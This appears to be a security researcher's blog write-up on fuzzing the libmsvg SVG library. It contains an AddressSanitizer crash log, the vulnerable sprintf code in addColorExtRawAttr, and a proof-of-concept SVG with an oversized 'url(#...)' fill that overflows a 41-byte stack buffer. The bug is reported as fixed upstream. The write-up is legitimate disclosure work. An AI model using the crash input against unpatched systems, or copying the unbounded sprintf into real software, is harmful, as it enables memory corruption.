
# Fuzzing libmsvg

I decided to fuzz this neat little library which I found: https://www.fgrim.com/libmsvg/

# Basic setup.

Just compile the library with afl-clang-fast and then compile the tcook program with it.

# Results.

After a bit of fuzzing, I found a couple of interesting crashes. I found a boring null pointer dereference and then later on I found a very interesting buffer overflow:

```

===== Normalize gradients to SVG Tiny 1.2
svg (xmlns = http://www.w3.org/2000/svg) (xmlns:xlink = http://www.w3.org/1999/xlink) (viewBox = 0 0 200 900)
  |-->defs
  |  |-->linearGradient (id = gnits) (x1 = 0) (y1 = 0) (x2 = 100) (y2 = 0) (gradientUnits = userSpaceOnUse)
  |  |  |-->stop (offset = 0%) (stop-color = #F60)
  |  |  |-->stop (offset = 100%) (stop-color = #FF6)
  |-->rect (width = 100) (height = 100) (fill = url(#gradientUnits))
  |-->g (transform = translate(100))
  |  |-->rect (width = 100) (height = 100) (fill = url(#gradi))
  |-->defs
  |  |-->linearGradient (id = gradientTransform) (gradientTransform = rotate(.5))
  |  |  |-->stop (offset = 0%) (stop-color = #F60)
  |  |  |-->stop (offset = 100%) (stop-color = #FF6)
  |-->g (transform = translate(0 100))
  |  |-->rect (width = 100) (height = 100) (fill = url(#gradientTra.w3.org/2001/DOM-Test-Suite/Levensform))
  |  |-->g (transform = translate(100))
  |  |  |-->rect (width = 100) (neight = 100) (fill = url(#gradientTransform))
  |-->defs
  |  |-->linearGradient (id = x1x2) (x1 = 40%) (x2 = 60%)
  |  |  |-->stop (offset = 0%) (stop-color = #F60)
  |  |  |-->stop (offset = 100%) (stop-color = #FF6)
  |-->g (transform = translate(0 200))
  |  |-->rect (width = 100) (height = 100) (fill = url(#x1x2))
  |  |-->g (transform = translate(100))
  |  |  |-->rect (width = 100) (height = 100) (fill = url(#x1x2))
  |-->defs
  |  |-->linearGradient (id = y1y2) (x2 = 0%) (y1 = 40%) (y2 = 60%)
  |  |  |-->stop (offset = 0%) (stop-color = #F60)
  |  |  |-->stop (offset = 100%) (stop-color = #FF6)
  |-->g (transform = translate(0 300))
  |  |-->rect (width = 100) (height = 100) (fill = url(#y1y2))
  |  |-->g (transform = translate(100))
  |  |  |-->rect (width = 100) (height = 100) (fill = url(#y1y2))
  |-->defs
  |  |-->radialGradient (id = cxcy) (cx = 0%) (cy = 100%)
  |  |  |-->stop (offset = 0%) (stop-color = #F60)
  |  |  |-->stop (offset = 100%) (stop-color = #FF6)
  |-->g (transform = translate(0 400))
  |  |-->rect (width = 100) (height = 100) (fill = url(#cxcy))
  |  |-->g (transform = translate(100))
  |  |  |-->rect (width = 100) (height = 100) (fill = url(#cxcy))
  |-->defs
  |  |-->radialGradient (id = r) (r = 100%)
  |  |  |-->stop (offset = 0%) (stop-color = #F60)
  |  |  |-->stop (offset = 100%) (stop-color = #FF6)
  |-->g (transform = translate(0 500))
  |  |-->rect (width = 100) (height = 100) (fill = url(#r))
  |  |-->g (transform = translate(100))
  |  |  |-->rect (width = 100) (height = 100) (fill = url(#r))
  |-->defs
  |  |-->radialGradient (id = fxfy) (fx = 20%) (fy = 80%)
  |  |  |-->stop (offset = 0%) (stop-color = #F60)
  |  |  |-->stop (offset = 100%) (stop-color = #FF6)
  |-->g (transform = translate(0 600))
  |  |-->rect (width = 100) (height = 100) (fill = url(#fxfy))
  |  |-->g (transform = translate(100))
  |  |  |-->rect (width = 100) (height = 100) (fill = url(#fxfy))
  |-->defs
  |  |-->linearGradient (id = spreadMethod) (x1 = 50%) (spreadMethod = reflect)
  |  |  |-->stop (offset = 0%) (stop-color = #F60)
  |  |  |-->stop (offset = 100%) (stop-color = #FF6)
  |-->g (transform = translate(0 700))
  |  |-->rect (width = 100) (height = 100) (fill = url(#spreadMethod))
  |  |-->g (transform = translate(100))
  |  |  |-->rect (width = 100) (height = 100) (fill = url(#spreadMethod))
  |-->defs
  |  |-->linearGradient
  |  |-->linearGradient (id = xlinkRef)
  |-->g (transform = translate(0 800))
  |  |-->rect (width = 100) (height = 100) (fill = url(#xlink))
  |  |-->g (transform = translate(100))
  |  |  |-->rect (width = 100) (height = 100) (fill = url(#xlinkRef))
  |-->path (stroke = black) (stroke-width = 3) (stroke-linecap = square) (fill = none) (d = M0 0H200V900H0V0        M0 100H20 M0 200H200        M0 300H200        M0 400H200        M0 500H200        M0 600H200        M0 ?00H200   0 900H200        M100 0V900)
===== Converting to cooked tree
svg
  width          200
  height         900
  vb_min_x       0
  vb_min_y       0
  vb_width       200
  vb_height      900
  vp_fill         NO_COLOR
  vp_fill_opacity 1
  --------- element MsvgPaintCtx
  fill           NODEFINED_COLOR
  fill_opacity   NODEFINED_VALUE
  stroke         NODEFINED_COLOR
  stroke_width   NODEFINED_VALUE
  stroke_opacity NODEFINED_VALUE
  tmatrix        (1 0 0 1 0 0)
  text-anchor    NODEFINED_IVALUE
  ifont-family   NODEFINED_IVALUE
  font-style     NODEFINED_IVALUE
  font-weight    NODEFINED_IVALUE
  font-size      NODEFINED_VALUE
===== Deleting all raw parameters
svg
  |-->defs
  |  |-->linearGradient
  |  |  |-->stop
  |  |  |-->stop
  |-->rect
  |-->g
  |  |-->rect
  |-->defs
  |  |-->linearGradient
  |  |  |-->stop
  |  |  |-->stop
  |-->g
  |  |-->rect
  |  |-->g
  |  |  |-->rect
  |-->defs
  |  |-->linearGradient
  |  |  |-->stop
  |  |  |-->stop
  |-->g
  |  |-->rect
  |  |-->g
  |  |  |-->rect
  |-->defs
  |  |-->linearGradient
  |  |  |-->stop
  |  |  |-->stop
  |-->g
  |  |-->rect
  |  |-->g
  |  |  |-->rect
  |-->defs
  |  |-->radialGradient
  |  |  |-->stop
  |  |  |-->stop
  |-->g
  |  |-->rect
  |  |-->g
  |  |  |-->rect
  |-->defs
  |  |-->radialGradient
  |  |  |-->stop
  |  |  |-->stop
  |-->g
  |  |-->rect
  |  |-->g
  |  |  |-->rect
  |-->defs
  |  |-->radialGradient
  |  |  |-->stop
  |  |  |-->stop
  |-->g
  |  |-->rect
  |  |-->g
  |  |  |-->rect
  |-->defs
  |  |-->linearGradient
  |  |  |-->stop
  |  |  |-->stop
  |-->g
  |  |-->rect
  |  |-->g
  |  |  |-->rect
  |-->defs
  |  |-->linearGradient
  |  |-->linearGradient
  |-->g
  |  |-->rect
  |  |-->g
  |  |  |-->rect
  |-->path
===== Serialize cooked tree
===== transforming elements
=========
rect
  x              0
  y              0
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       gradientUnits
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              100
  y              0
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       gradi
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              0
  y              100
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       gradientTra.w3.org/2001/DOM-Test-Suite/Levensform
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              100
  y              100
  width          100
  height         0
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       gradientTransform
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              0
  y              200
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       x1x2
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              100
  y              200
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       x1x2
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              0
  y              300
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       y1y2
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              100
  y              300
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       y1y2
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              0
  y              400
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       cxcy
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              100
  y              400
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       cxcy
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              0
  y              500
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       r
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              100
  y              500
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       r
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              0
  y              600
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       fxfy
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              100
  y              600
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       fxfy
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              0
  y              700
  width          100
  height         100
  rx             0
  ry             0
  --------- element MsvgPaintCtx
  fill           IRI_COLOR
  fill_iri       spreadMethod
  fill_opacity   1
  stroke         NO_COLOR
  stroke_width   1
  stroke_opacity 1
  tmatrix        (1 0 0 1 0 0)
  text-anchor    1
  ifont-family   2
  font-style     1
  font-weight    400
  font-size      12
=========
rect
  x              100
  y              700
  width          100
  height         100
  rx             0
  ry             0
  --------- elemen=================================================================
==3716478==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f23e6c02999 at pc 0x5611ce4f7873 bp 0x7ffd3336c540 sp 0x7ffd3336bd00
WRITE of size 55 at 0x7f23e6c02999 thread T0
    #0 0x5611ce4f7872 in __interceptor_vsprintf /home/cyberhacker/Asioita/newaflfuzz/shit/llvm-project-llvmorg-15.0.7/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:1765:1
    #1 0x5611ce4f7b4e in sprintf /home/cyberhacker/Asioita/newaflfuzz/shit/llvm-project-llvmorg-15.0.7/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:1808:1
    #2 0x5611ce593d8e in addColorExtRawAttr /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/src/cook2raw.c:58:17
    #3 0x5611ce590f3b in torawPCtxAttr /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/src/cook2raw.c:225:5
    #4 0x5611ce590f3b in toRawElement /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/src/cook2raw.c:411:5
    #5 0x5611ce593730 in toRawElement /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/src/cook2raw.c:476:9
    #6 0x5611ce593785 in toRawElement /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/src/cook2raw.c:479:9
    #7 0x5611ce593785 in toRawElement /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/src/cook2raw.c:479:9
    #8 0x5611ce593785 in toRawElement /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/src/cook2raw.c:479:9
    #9 0x5611ce593785 in toRawElement /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/src/cook2raw.c:479:9
    #10 0x5611ce593730 in toRawElement /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/src/cook2raw.c:476:9
    #11 0x5611ce590adc in MsvgCooked2RawTree /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/src/cook2raw.c:488:5
    #12 0x5611ce57d755 in main /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/test/tcook.c:108:9
    #13 0x7f23e9071082 in __libc_start_main /build/glibc-BHL3KM/glibc-2.31/csu/../csu/libc-start.c:308:16
    #14 0x5611ce48642d in _start (/home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/test/tcook+0x2942d)

Address 0x7f23e6c02999 is located in stack of thread T0 at offset 153 in frame
    #0 0x5611ce593c4f in addColorExtRawAttr /home/cyberhacker/Asioita/Hakkerointi/Svgthing/libmsvg/src/cook2raw.c:52

  This frame has 2 object(s):
    [32, 73) 's.i' (line 37)
    [112, 153) 's' (line 53) <== Memory access at offset 153 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow /home/cyberhacker/Asioita/newaflfuzz/shit/llvm-project-llvmorg-15.0.7/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:1765:1 in __interceptor_vsprintf
Shadow bytes around the buggy address:
  0x0fe4fcd784e0: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5
  0x0fe4fcd784f0: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5
  0x0fe4fcd78500: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5
  0x0fe4fcd78510: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5
  0x0fe4fcd78520: f1 f1 f1 f1 f8 f8 f8 f8 f8 f8 f2 f2 f2 f2 00 00
=>0x0fe4fcd78530: 00 00 00[01]f3 f3 f3 f3 00 00 00 00 00 00 00 00
  0x0fe4fcd78540: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe4fcd78550: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe4fcd78560: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe4fcd78570: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe4fcd78580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3716478==ABORTING
all_crashes/id:000074,sig:06,src:006265,time:9942440,execs:8964036,op:havoc,rep:2



```

After manually reviewing the code, the bug becomes quite obvious:

```

static void addColorExtRawAttr(MsvgElement *el, char *key, rgbcolor color, char *iri)
{
    char s[41];
    
    if (color != NODEFINED_COLOR) {
        if (color == IRI_COLOR) {
            if (iri != NULL) {
                sprintf(s, "url(#%s", iri);
                MsvgAddRawAttribute(el, key, s);
            }
        }
        else {
            addColorRawAttr(el, key, color);
        }
    }
}

```

and here is the proof of concept exploit for this bug:

```
<svg><rect fill="url(#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)"/></svg>
```

just paste that into a file called crash.svg and then call `./tcook -w -utc -ng crash.svg` and observe the ASAN report. I reported this buffer overflow to the package maintainer and the bug was promptly fixed in commit 9b84f82044c405709194092a8db567a7d68f4b8a as you can see here: https://github.com/malfer/libmsvg/commit/9b84f82044c405709194092a8db567a7d68f4b8a

# Final thoughts.

This buffer overflow was quite hard to find, since it required the initial "url(#" string to appear in the fuzzed svg file for this bug to be able to be discovered. Just goes to showing how important it is to start with a good corpus. :D
















